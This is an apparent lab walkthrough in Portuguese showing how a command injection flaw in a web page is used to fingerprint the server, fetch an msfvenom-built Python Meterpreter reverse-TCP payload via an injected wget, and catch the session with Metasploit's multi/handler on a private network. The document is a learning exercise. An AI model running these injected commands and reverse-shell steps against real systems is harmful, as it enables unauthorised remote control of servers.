# Command Injection com Meterpreter

**Objetivo:** repetir o exercício de invasão web com command injection, porém carregando um payload na máquina alvo para nos permitir acesso a um meterpreter.

## Conhecendo mais sobre o servidor web

Utilizando o injeção de comandos, podemos saber um pouco mais sobre o servidor que hospeda a página sendo atacada.

* Para conhecer o sistema operacional: `; uname -a`
  !Comando
  !Resposta
  O servidor usa o Linux
* Para conhecer a arquitetura: `; uname -m`
  !Comando
  !Resposta
  Com uma arquitetura de 32 bits
  
## Criação do payload

Criaremos o payload através do aplicativo msfvenom do metasploit.

### Passo 1 - Procura e escolha o payload

Comando: `msfvenom -l payloads | grep <filtro>`

```
$ msfvenom -l payloads | grep meterpreter | grep python
                                       
    cmd/unix/python/meterpreter/bind_tcp                               Execute a Python payload as an OS command from a Posix-compatible shell. Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Listen for a connection
    cmd/unix/python/meterpreter/bind_tcp_uuid                          Execute a Python payload as an OS command from a Posix-compatible shell. Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Listen for a connection with UUID Support
...
    python/meterpreter/reverse_tcp                                     Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Connect back to the attacker
    python/meterpreter/reverse_tcp_ssl                                 Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Reverse Python connect back stager using SSL
    python/meterpreter/reverse_tcp_uuid                                Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Connect back to the attacker with UUID Support
    python/meterpreter_bind_tcp                                        Connect to the victim and spawn a Meterpreter shell
    python/meterpreter_reverse_http                                    Connect back to the attacker and spawn a Meterpreter shell
    python/meterpreter_reverse_https                                   Connect back to the attacker and spawn a Meterpreter shell
    python/meterpreter_reverse_tcp                                     Connect back to the attacker and spawn a Meterpreter shell
```
Selecionamos o payload **python/meterpreter/reverse_tcp**. 

### Passo 2 - Configuração e criação do payload

Para conhecer as opções de configuração do payload, usamos o msfconsole do metasploit:

```
$ msfconsole                                                                                    
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d
                                                  
       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use python/meterpreter/reverse_tcp

msf payload(python/meterpreter/reverse_tcp) > show options

Module options (payload/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


View the full module info with the info, or info -d command.

msf payload(python/meterpreter/reverse_tcp) > exit
```
Criamos o payload informando o IP e a porta de escuta:
```
$ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=6666 >>meu_payload.py
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 432 bytes
```
`>>meu_payload` informa o arquivo de saída com o payload. No caso, meu_payload.py gravado no diretório corrente.
```
$ ls *.py                                                                                
meu_payload.py
```
## Disponibilização do payload

### Passo 1 - iniciar o serviço web
```
$ sudo service apache2 start
[sudo] senha para OpsShadow: 
```
### Passo 2 - copiar o payload para o serviço web
```
$ sudo cp meu_payload.py /var/www/html/                                                         

$ ls /var/www/html                                                         
index.html  index.lighttpd.html  index.nginx-debian.html  meu_payload.py
```
### Passo 3 - copiar o payload para a máquina alvo
`; wget <ip>/<payload>`
### Passo 4 - encerrar o serviço web
`$ sudo service apache2 stop `
## Execução do ataque

### Passo 1 - iniciar a escuta
Iniciamos a escuta informando o IP e a porta de escuta (a  mesma do payload), e o payload
```
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf exploit(multi/handler) > set LHOST 192.168.1.10
LHOST => 192.168.1.10

msf exploit(multi/handler) > set LPORT 6666 
LPORT => 6666
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:6666

msf exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
```
### Passo 2 - Executar o payload no alvo



### Resultado
```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:6666 
[*] Sending stage (24772 bytes) to 192.168.1.33
[*] Meterpreter session 1 opened (192.168.1.10:6666 -> 192.168.1.33:38448) at 2025-09-12 00:10:58 -0300

meterpreter >
```
Abertura do meterpreter com acesso a máquina alvo.

